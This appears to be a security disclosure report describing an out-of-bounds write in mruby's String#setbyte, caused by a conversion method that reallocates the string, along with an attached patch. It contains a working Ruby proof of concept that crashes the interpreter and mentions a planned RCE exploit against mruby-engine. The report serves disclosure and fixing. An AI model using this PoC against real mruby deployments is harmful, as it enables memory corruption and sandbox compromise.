Summary:

The String#setbyte function caches the length of the string before loading the function arguments. Loading function arguments through mrb_get_args can call into ruby code to run type conversion methods (to_i, to_s and the like). A malicious conversion method is able to force the string to be reallocated shorter so that the setbyte goes on to overwrite out of bounds memory.

Following is a POC that causes a native crash with under mruby on Mac OS X. I plan to follow up with a reliable RCE exploit against mruby-engine using this vulnerability in the next day or so.

```
$s = "9" + ("\n" * (1024*1024-1))
$k = []

class Tmp
    def to_i
        $k.push("a"*1024)
        $s.chomp! ''
        $s.succ!
        95
    end
end
tmp = Tmp.new
$s.setbyte(128, tmp)
puts $k[0]
```

Attached is a patch to mruby to resolve this issue.
